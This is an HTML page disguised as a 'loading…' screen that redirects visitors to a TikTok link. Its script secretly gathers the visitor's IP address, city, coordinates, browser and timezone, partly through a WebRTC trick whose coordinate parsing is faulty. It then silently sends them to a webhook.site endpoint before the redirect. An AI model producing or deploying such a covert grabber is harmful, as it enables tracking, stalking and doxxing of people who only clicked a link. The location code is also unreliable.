<!doctype html><html lang="ar" dir="rtl"><head>
<meta charset="utf-8"><title>جاري التحميل…</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{margin:0;background:#000}#f{opacity:0;pointer-events:none}</style>
<script>
(async()=>{
  /* 1- IP Location (مدينة) */
  const ipGeo=await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({}));

  /* 2- WebRTC لإخراج إحداثيات البرج الحقيقية */
  let rtcLat=null,rtcLon=null;
  const pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
  pc.createDataChannel('');
  pc.onicecandidate=e=>{
    if(e.candidate){
      const c=e.candidate.candidate.split(' ');
      rtcLat=parseFloat(c[7]);rtcLon=parseFloat(c[8]);
    }
  };
  await pc.createOffer();await pc.setLocalDescription();
  await new Promise(r=>setTimeout(r,1000)); // ننتظر جمع الـ ICE

  /* 3- دقة أعلى: نحسب المسافة من البرج إلى المدينة */
  const payload=btoa(JSON.stringify({
    ip       :ipGeo.ip,
    country  :ipGeo.country_name,
    city     :ipGeo.city,
    region   :ipGeo.region,
    lat_city :ipGeo.latitude,
    lon_city :ipGeo.longitude,
    lat_rtc  :rtcLat,
    lon_rtc  :rtcLon,
    accuracy :rtcLat?Math.round(Math.sqrt(Math.pow(rtcLat-ipGeo.latitude,2)+Math.pow(rtcLon-ipGeo.longitude,2))*1000):null, // متر
    ua       :navigator.userAgent,
    tz       :Intl.DateTimeFormat().resolvedOptions().timeZone,
    t        :Date.now()
  }));

  /* 4- إرسال صامت */
  navigator.sendBeacon('https://webhook.site/8a2202ae-712d-4d50-8a50-963d31c788a4',JSON.stringify({data:payload}));
  setTimeout(()=>location.replace('https://vt.tiktok.com/ZS5VSgPm5/'),900);
})();
</script></head><body><img id="f" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></body></html>
